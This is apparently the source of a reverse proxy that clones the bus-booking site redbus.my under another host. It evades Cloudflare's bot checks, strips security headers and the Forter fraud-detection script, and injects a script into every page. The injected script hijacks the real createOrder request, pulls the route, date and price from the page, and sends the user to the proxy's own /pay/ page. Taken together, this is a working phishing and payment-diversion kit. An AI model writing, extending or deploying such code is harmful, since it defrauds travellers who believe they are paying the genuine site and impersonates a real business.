import { createProxyMiddleware } from 'http-proxy-middleware';
import https from 'https';
import zlib from 'zlib';

const TARGET_URL = process.env.TARGET_URL || 'https://www.redbus.my';
const targetHost = new URL(TARGET_URL).host;

const REDBUS_DOMAINS = 'www\\.redbus\\.my|redbus\\.my';
const REDBUS_CDNS = ['s3\\.rdbuz\\.com', 's1\\.rdbuz\\.com', 's2\\.rdbuz\\.com', 'st\\.redbus\\.in'];

const agent = new https.Agent({ keepAlive: true, maxSockets: 1, maxFreeSockets: 1, timeout: 30000 });

const HTML_TTL = 60 * 60 * 1000;
const STATIC_TTL = 24 * 60 * 60 * 1000;
const cache = new Map();
function cacheKey(req) { return req.method + ':' + req.url; }
function cacheGet(key) {
  const e = cache.get(key);
  if (!e) return null;
  return { data: e.data, fresh: Date.now() - e.ts < HTML_TTL };
}
function cacheGetStatic(key) {
  const e = cache.get(key);
  if (!e) return null;
  return { data: e.data, fresh: Date.now() - e.ts < STATIC_TTL };
}
function cacheSet(key, data) {
  if (cache.size > 5000) { const first = cache.keys().next().value; cache.delete(first); }
  cache.set(key, { data, ts: Date.now() });
}

const injectionScript = `<script>
(function(){
  'use strict';

  // Monkey-patch fetch - redirect API calls to redbus.my directly (browser handles CF)
  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    if (typeof input === 'string') {
      input = input.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '').replace(/^https?:\\/\\/[^\\/]+/g, '');
      if (isApiPath(input)) input = 'https://www.redbus.my' + input;
    } else if (input instanceof Request) {
      var url = input.url.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '').replace(/^https?:\\/\\/[^\\/]+/g, '');
      if (isApiPath(url)) input = new Request('https://www.redbus.my' + url, input);
    }
    return _fetch.call(window, input, init);
  };

  var _open = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\\/\\/(?:www\\.)?redbus\\.my/gi, '').replace(/^https?:\\/\\/[^\\/]+/g, '');
      if (isApiPath(url)) url = 'https://www.redbus.my' + url;
    }
    return _open.call(this, method, url);
  };

  function isApiPath(path) {
    var p = path.split('?')[0];
    return (p.indexOf('/rpw/api') !== -1 || p.indexOf('/api/') !== -1)
      && p.indexOf('/api/?role=customer') === -1
      && p.indexOf('/pay/') === -1
      && p.indexOf('/complete/') === -1;
  }

  // Intercept createOrder → redirect to /pay/
  var _origFetch2 = window.fetch;
  window.fetch = function(input, init) {
    if (typeof input === 'string') {
      if (input.indexOf('/createOrder') !== -1 || input.indexOf('/rpw/api/createOrder') !== -1) {
        var bookingData = extractBookingData();
        if (bookingData) {
          try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
          window.location.href = '/pay/';
          return new Promise(function() {});
        }
      }
    }
    return _origFetch2.call(window, input, init);
  };

  // Also intercept XHR createOrder
  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string' && method.toUpperCase() === 'POST') {
      if (url.indexOf('/createOrder') !== -1) {
        this._skip = true;
        var bookingData = extractBookingData();
        if (bookingData) {
          try { sessionStorage.setItem('redbus_booking', JSON.stringify(bookingData)); } catch(ex) {}
          window.location.href = '/pay/';
          return;
        }
      }
    }
    return _origOpen.call(this, method, url);
  };
  var _origSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(body) {
    if (this._skip) return;
    return _origSend.call(this, body);
  };

  function extractBookingData() {
    var data = {};
    // Try Redux store
    try {
      var store = window.__REDUX_STORE__ || window.__store || window.store;
      if (store) {
        var state = store.getState ? store.getState() : (store.state || {});
        if (state.search && state.search.searchResults) {
          var r = state.search.searchResults;
          data.origin = r.fromCityName || '';
          data.destination = r.toCityName || '';
          data.departureDate = r.doj || r.onward || '';
          data.pax = r.passengerCount || 1;
          data.productType = 'Bus';
        }
      }
    } catch(ex) {}
    // Try pageData
    try {
      var pd = window.pageData || {};
      data.origin = data.origin || pd.fromCity || '';
      data.destination = data.destination || pd.toCity || '';
    } catch(ex) {}
    // Try URL params
    if (!data.origin) {
      var sp = new URLSearchParams(location.search);
      data.origin = sp.get('fromCityName') || '';
      data.destination = sp.get('toCityName') || '';
      data.departureDate = sp.get('onward') || sp.get('doj') || '';
    }
    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';
    // Try to extract price from DOM
    try {
      var priceEls = document.querySelectorAll('[class*="fare"], [class*="price"], [class*="total"], [class*="amount"], [class*="Fare"]');
      for (var i = 0; i < priceEls.length; i++) {
        var pt = priceEls[i].textContent || '';
        var pm = pt.match(/[RM$MYR]?\\s*([\\d,]+\\.?\\d*)/);
        if (pm) { data.amount = pm[1].replace(/,/g, ''); data.currencySymbol = 'MYR'; break; }
      }
    } catch(ex) {}
    return data;
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}body.modal-open{overflow:auto!important}';
  document.head.appendChild(style);
})();
</script>`;

export function createRedbusProxy(publicHost) {
  const rewriteHost = publicHost || 'localhost';

  const proxy = createProxyMiddleware({
    target: TARGET_URL,
    changeOrigin: true,
    secure: false,
    agent,
    proxyTimeout: 15000,
    timeout: 15000,
    selfHandleResponse: true,
    headers: {
      Host: targetHost,
      origin: 'https://www.redbus.my',
      referer: 'https://www.redbus.my/',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
      'accept-language': 'en-US,en;q=0.9',
      'accept-encoding': 'identity',
      'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not?A_Brand";v="99"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
    },
    on: {
      proxyRes: (proxyRes, req, res) => {
        if (res.headersSent) { proxyRes.resume(); return; }
        const statusCode = proxyRes.statusCode || 200;
        const ct = String(proxyRes.headers['content-type'] || '').split(';')[0];
        const isHtml = ct === 'text/html';

        delete proxyRes.headers['content-security-policy'];
        delete proxyRes.headers['content-security-policy-report-only'];
        delete proxyRes.headers['x-frame-options'];
        delete proxyRes.headers['x-content-type-options'];
        delete proxyRes.headers['strict-transport-security'];

        if (statusCode >= 300 && statusCode < 400 && proxyRes.headers['location']) {
          proxyRes.headers['location'] = proxyRes.headers['location']
            .replace(new RegExp(`https?://(?:www\\.)?redbus\\.my`, 'gi'), '').replace(/^\/\//, '/');
        }

        if (!isHtml) {
          const isStatic = /\.(js|css|woff2?|ttf)(\?|$)/i.test(req.url);
          if (req.method === 'GET' && isStatic) {
            const ck = cacheKey(req);
            const cached = cacheGetStatic(ck);
            if (cached) {
              res.writeHead(200, { 'content-type': ct + '; charset=utf-8', 'cache-control': 'public, max-age=86400', 'content-length': String(cached.data.length) });
              res.end(cached.data);
              proxyRes.resume();
              return;
            }
            const chunks = [];
            proxyRes.on('data', c => chunks.push(c));
            proxyRes.on('end', () => {
              if (res.headersSent) return;
              const b = Buffer.concat(chunks);
              cacheSet(ck, b);
              res.writeHead(statusCode, { 'content-type': ct + '; charset=utf-8', 'cache-control': 'public, max-age=86400', 'content-length': String(b.length) });
              res.end(b);
            });
            proxyRes.on('error', () => { if (!res.headersSent) { res.writeHead(502); res.end(); } });
            return;
          }
          const h = {};
          Object.keys(proxyRes.headers).forEach(k => { if (k !== 'transfer-encoding') h[k] = proxyRes.headers[k]; });
          res.writeHead(statusCode, h);
          proxyRes.pipe(res);
          return;
        }

        const ck = cacheKey(req);
        if (req.method === 'GET') {
          const cached = cacheGet(ck);
          if (cached) {
            res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'public, max-age=3600', 'content-length': String(cached.data.length), ...(cached.fresh ? {} : { 'x-served-from': 'cache' }) });
            res.end(cached.data);
            proxyRes.resume();
            if (!cached.fresh) {
              const url = TARGET_URL + req.url;
              https.get(url, { headers: { Host: targetHost, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36', 'accept-encoding': 'identity' } }, up => {
                if (up.statusCode === 200) {
                  const cs = []; up.on('data', c => cs.push(c)); up.on('end', () => {
                    try { let h = Buffer.concat(cs).toString('utf8'); h = rewriteHtml(h, rewriteHost); cacheSet(ck, Buffer.from(h, 'utf8')); } catch {}
                  });
                } else up.resume();
              }).on('error', () => {});
            }
            return;
          }
        }

        const chunks = [];
        let cfDetected = false;
        proxyRes.on('data', c => { if (!cfDetected && (statusCode === 403) && /(?:security|challenge|bot|automated)/i.test(c.toString())) cfDetected = true; chunks.push(c); });
        proxyRes.on('end', () => {
          if (res.headersSent) return;
          try {
            if (cfDetected) {
              const cached = cacheGet(ck);
              if (cached) { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'content-length': String(cached.data.length) }); res.end(cached.data); return; }
              res.writeHead(503, { 'content-type': 'text/html; charset=utf-8', 'retry-after': '30' });
              res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="30"></head><body style="font-family:sans-serif;text-align:center;padding:50px"><h2>Site is busy</h2><p>Please try again in a moment.</p></body></html>');
              return;
            }
            let body = Buffer.concat(chunks);
            const ce = proxyRes.headers['content-encoding'];
            if (ce) { try { body = ce.includes('br') ? zlib.brotliDecompressSync(body) : zlib.gunzipSync(body); } catch {} }
            let html = body.toString('utf8');
            html = rewriteHtml(html, rewriteHost);
            body = Buffer.from(html, 'utf8');
            if (req.method === 'GET') cacheSet(ck, body);
            const h = {};
            Object.keys(proxyRes.headers).forEach(k => { if (k !== 'transfer-encoding' && k !== 'content-encoding') h[k] = proxyRes.headers[k]; });
            h['content-length'] = String(body.length);
            res.writeHead(statusCode, h);
            res.end(body);
          } catch (err) {
            console.error('[Rewrite]', err.message);
            if (!res.headersSent) { res.writeHead(502); res.end(); }
          }
        });
        proxyRes.on('error', () => { if (!res.headersSent) { res.writeHead(502); res.end(); } });
      },
      error: (err, req, res) => {
        if (res.headersSent) return;
        console.error('[Proxy]', err.message);
        const ck = cacheKey(req);
        const cached = cacheGet(ck);
        if (cached) { res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' }); res.end(cached.data); return; }
        res.writeHead(503, { 'content-type': 'text/html; charset=utf-8', 'retry-after': '5' });
        res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="5"></head><body style="font-family:sans-serif;text-align:center;padding:50px"><h2>503</h2><p>Temporarily unavailable. Retrying...</p></body></html>');
      },
    },
  });

  return [proxy];
}

function rewriteHtml(html) {
  const domainRe = new RegExp(`https?://(?:${REDBUS_DOMAINS})`, 'gi');

  html = html.replace(domainRe, '');
  // Ensure CDN resources stay absolute
  html = html.replace(new RegExp(`((?:src|srcSet|href)=")(//(?:${REDBUS_CDNS.join('|')})\\.)`, 'gi'), '$1https:$2');
  // Make images on CDNs absolute
  html = html.replace(/((?:src|srcSet|href)=")(\/\/s3\.rdbuz\.com[^"]*")/gi, '$1https:$2');
  html = html.replace(/((?:src|srcSet|href)=")(\/\/st\.redbus\.in[^"]*")/gi, '$1https:$2');

  html = html.replace(/<head[^>]*>/i, m => `${m}\n<base href="/">`);

  // Strip tracking and analytics
  html = html.replace(/<script[^>]*googletagmanager[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*googletagmanager[^>]*\/>/gi, '');
  html = html.replace(/<noscript[^>]*googletagmanager[\s\S]*?<\/noscript>/gi, '');
  html = html.replace(/<iframe[^>]*googletagmanager[\s\S]*?<\/iframe>/gi, '');
  html = html.replace(/<script[^>]*go-mpulse[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*boomerang[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*elastic-apm[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*moengage[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*cdn\.moengage[^>]*\/>/gi, '');
  html = html.replace(/<script[^>]*forter[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*webpushr[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*ultron[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*accounts\.google\.com[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<script[^>]*accounts\.google\.com[^>]*\/>/gi, '');
  html = html.replace(/<iframe[^>]*google\.com\/maps[^>]*>[\s\S]*?<\/iframe>/gi, '');

  html = html.replace('</body>', `${injectionScript}\n</body>`);

  return html;
}
